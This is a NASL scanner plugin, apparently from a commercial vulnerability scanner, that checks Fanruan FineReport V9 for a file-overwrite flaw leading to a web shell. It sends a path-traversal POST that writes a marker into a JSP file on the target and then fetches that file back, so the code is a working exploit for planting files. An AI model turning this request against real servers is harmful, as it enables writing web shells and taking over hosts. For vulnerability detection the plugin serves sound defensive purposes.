include("compat.inc");


if (description)
{
  script_id(51799322); #WEBRAY_SID
  script_version("1.3");
  script_name(english:"Fanruan FineReport V9 file overwrite causes GetShell vulnerability");
  script_summary(english:"Fanruan FineReport V9 file overwrite causes GetShell vulnerability");
  script_set_attribute(attribute:"description", value:"Fanruan FineReport V9 file overwrite causes GetShell vulnerability.");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www");
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


ports = get_kb_list("Services/www");
foreach port (ports){
	result_r = check_remote(port:port);
	if (result_r['vuln']){
		security_hole(port:port, data:result_r['report']);
		exit(0);
	}
}

function check_remote(port){
	url = "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update1.jsp";
	random_str = hexstr(rand_str(length:8));
	data = '{{"__CONTENT__":"'+ random_str +'","__CHARSET__":"UTF-8"}}';
	if (get_kb_list("SSL/Transport/"+port)){
		var req =
				'POST '+ url +' HTTP/1.1\r\n' +
				'Host: ' + get_host_ip()+':'+ port+ '\r\n' +
				'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' + '\r\n' +
				'Accept-Encoding: gzip, deflate' + '\r\n' +
				'Content-Type: text/xml;charset=UTF-8' + '\r\n' +
				'Accept-Au: 0c42b2f264071be0507acea1876c74' + '\r\n' +
				'Connection: keep-alive'+ '\r\n' +
				'Accept: */*' + '\r\n' + 
				'\r\n'+data;
				
		ssl_reqs = https_req_get(request:req, port:port);
		if("FineReport" >< ssl_reqs){
			sleep(1);
			url_r = "/WebReport/update1.jsp";
			res = http_get(item:url_r, port:port);
			
			ssl_ress = https_req_get(request:res, port:port);
			
			if(random_str >< ssl_ress && "HTTP/1.1 200" ><ssl_ress){
				report = ssl_ress;
				return {'vuln':true, 'report':report};
			}
		}
	}
	else{
		resp = http_send_recv3(method: "POST",port: port, data:data, item: url, add_headers: make_array("Content-Type","text/xml;charset=UTF-8","Accept-Au","0c42b2f264071be0507acea1876c74"));
		if("FineReport" >< resp[2]){
			sleep(1);
			url_r = "/WebReport/update1.jsp";
			res_send = http_send_recv3(method: "GET",port: port, item: url_r);
			
			if(random_str >< res_send[2] && "HTTP/1.1 200" ><res_send[0]){
				report = res_send[2];
				return {'vuln':true, 'report':report};
			}
		}

	}
}
